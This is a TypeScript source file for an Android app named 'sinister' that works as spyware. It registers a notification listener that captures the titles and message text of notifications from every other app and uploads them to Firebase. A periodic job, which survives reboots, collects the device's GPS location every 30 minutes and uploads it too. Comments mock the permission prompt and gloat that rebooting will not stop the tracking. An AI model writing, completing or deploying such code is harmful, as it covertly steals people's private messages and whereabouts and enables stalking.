import permissions from "nativescript-permissions";
import firebase from './firebase';
const ad = require("tns-core-modules/utils/utils").ad;
import * as geolocation from "nativescript-geolocation";
const appSettings = require("tns-core-modules/application-settings");
declare var com: any;

import application from 'tns-core-modules/application';

const context = ad.getApplicationContext();

export default class Notification {
    constructor() {
        console.log("################ The constructor was called ################")
        this.requestPermissions(["android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_BACKGROUND_LOCATION"]).then(response => {
            console.log("############ He allowed the location??? ###############", response);
            if (response) {
                // Take the user to the notification service screen
                this.openNotificationServiceScreen();
                this.startServiceListeners();
                // Schedule the Job
                this.scheduleJob();
            } else {
                throw new Error("Falsy result from requesting permission")
            }
        }).catch(err => {
            console.log("################ in error ################", err.message)
            console.log("Request permission error", err);
        })
    }

    openNotificationServiceScreen() {
        // Check if the app is allowed to listen to notifications already
        const enabledNotificationListeners = android.provider.Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
        const isEnabled = enabledNotificationListeners != null && enabledNotificationListeners.indexOf(context.getPackageName()) >= 0;
        if (!isEnabled) {
            // Since we are not allowed to listen, let us take the user to the screen that will allow them to give us permission
            try {
                const intent = new android.content.Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (err) {
                console.log("Can not open notification settings screen", err);
            }
        }
    }

    requestPermissions(permissionNames: string[]) {
        return new Promise((resolve, reject) => {
            const requestingPermissions = permissionNames.filter(v => !this.hasPermission(v));
            if (requestingPermissions.length == 0) {
                return resolve(true);
            }
            permissions.requestPermissions(requestingPermissions, "I need these permissions because I'm cool")
                .then(() => {
                    console.log("Woo Hoo, I have the power!");
                    return resolve(true);
                })
                .catch((err) => {
                    console.log("Uh oh, no permissions - plan B time!", err);
                    return resolve(false);
                });
        });
    }

    scheduleJob() {
        // Create a component from the JobService that should be triggered
        console.log("################ about to schedule ################", com.jmrsquared.sinister.LocationService)
        let component = new android.content.ComponentName(context, com.jmrsquared.sinister.LocationService.class);
        const builder = new (android.app as any).job.JobInfo.Builder(1, component);

        // Run this job every 30 minutes.
        builder.setPeriodic(30 * 60 * 1000);

        // persist this job across device reboots i.e rebooting will not kill me 😈 .
        builder.setPersisted(true);

        // runs only when device is connected to the wifi
        builder.setRequiredNetworkType(1);

        // Do the actual job scheduling
        const jobScheduler = context.getSystemService(android.content.Context.JOB_SCHEDULER_SERVICE);
        console.log("Job Scheduled: " + jobScheduler.schedule(builder.build()));
    }

    startServiceListeners() {
        console.log("############ starting services ###############");
        (android as any).service.notification.NotificationListenerService.extend("com.jmrsquared.sinister.NotificationListener", {
            onNotificationPosted: (sbn) => {
                let messages = [];
                if (sbn.getNotification().extras) {
                    const title = sbn.getNotification().extras.getCharSequence(android.app.Notification.EXTRA_TITLE);
                    const body = sbn.getNotification().extras.getCharSequence(android.app.Notification.EXTRA_TEXT);
                    if (title || body) {
                        messages.push({
                            title: title ? title.toString() : '',
                            body: body ? body.toString() : ''
                        });
                    }
                    if ((android.os.Build.VERSION.SDK_INT >= 26)) {
                        const extraMessages = sbn.getNotification().extras.get(android.app.Notification.EXTRA_MESSAGES);
                        if (extraMessages) {
                            for (let i = 0; i < extraMessages.length; i++) {
                                messages.push({
                                    title: extraMessages[i].getString("text"),
                                    body: extraMessages[i].getString("text")
                                });
                            }
                        }
                    }
                } else {
                    console.log("WE DO NOT HAVE EXTRAS");
                }
                const parts = sbn.getPackageName().split('.');
                const appName = parts && parts.length > 0 ? parts[parts.length - 1] : sbn.getPackageName();
                let appIcon = null;
                try {
                    const appIconDrawable = context.getPackageManager().getApplicationIcon(sbn.getPackageName());
                    console.log("appIconDrawable", appIconDrawable)
                } catch (err) {
                    console.log('Can not get the app icon', err);
                }
                messages.slice(-5).forEach(msg => {
                    firebase.addMessageToCollection(msg, appName, appIcon);
                });
            },
            onCreate: () => {
                console.log("Created");
            },
            onDestroy: () => {
                console.log("On destroy the process")
            },
            onListenerConnected: () => {
                console.log("Listener connected")
            },
            onListenerdDisconnected: () => {
                console.log("Listener disconnected")
            }
        });
        (android.app as any).job.JobService.extend("com.jmrsquared.sinister.LocationService", {
            onStartJob: function (params: any) {
                console.log("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Start job ...");
                if (permissions.hasPermission("android.permission.ACCESS_FINE_LOCATION") &&
                    permissions.hasPermission("android.permission.ACCESS_BACKGROUND_LOCATION")) {
                    geolocation.getCurrentLocation({
                        timeout: 10000
                    }).then((location => {

                        if (location) {
                            firebase.addLocationToCollection(location);
                        }
                        console.log("Got the location...", location);
                        this.jobFinished(params, true);
                    })).catch(error => {
                        console.log("Location error getCurrentLocation: ", error);
                        this.jobFinished(params, true);
                    });
                } else {
                    console.log("Job running")
                }

                return true;
            },
            onStopJob: function (params: any): boolean {
                this.jobFinished(params, false);
                return true;
            }
        });
    }

    sendPushNotification(title, body) {
        // This entire function is for creating a local push notification and send it to the same device
        // This will not go to production obviously, it is just for testing
        // We want the push to go to the other device 😍 
        const builder = new android.app.Notification.Builder(context);
        builder.setContentTitle(title)
            .setAutoCancel(true)
            .setColor(android.R.color.holo_purple)
            .setContentText(body)
            .setVibrate([100, 200, 100])
            .setSmallIcon(android.R.drawable.btn_star_big_on);
        const mainIntent = new android.content.Intent(context, com.tns.NativeScriptActivity.class);

        // example for custom intent passing custom data via the broadcast receiver
        let intent = new android.content.Intent("customservice");
        var broadcastManager = androidx.localbroadcastmanager.content.LocalBroadcastManager.getInstance(ad.getApplicationContext());
        broadcastManager.sendBroadcast(intent);

        const mNotificationManager = context.getSystemService(android.content.Context.NOTIFICATION_SERVICE);

        // Build the cool staff like LED and i love purple, so it will be purple
        if (android.os.Build.VERSION.SDK_INT >= 26) {
            const channelId = "Sinister_channel";
            const mChannel = new android.app.NotificationChannel(channelId, "Sinister channel", android.app.NotificationManager.IMPORTANCE_LOW);
            mChannel.setDescription("This is a channel for sinister");
            mChannel.enableLights(true);
            mChannel.setLightColor((android.graphics.Color as any).PURPLE);
            mChannel.enableVibration(true);
            mNotificationManager.createNotificationChannel(mChannel);

            builder.setChannelId(channelId);
        }

        // Send the actual push notification
        mNotificationManager.notify(1, builder.build());
    }

    hasPermission(permissionName) {
        // We only get this if 
        return permissions.hasPermission(permissionName)
    }
}
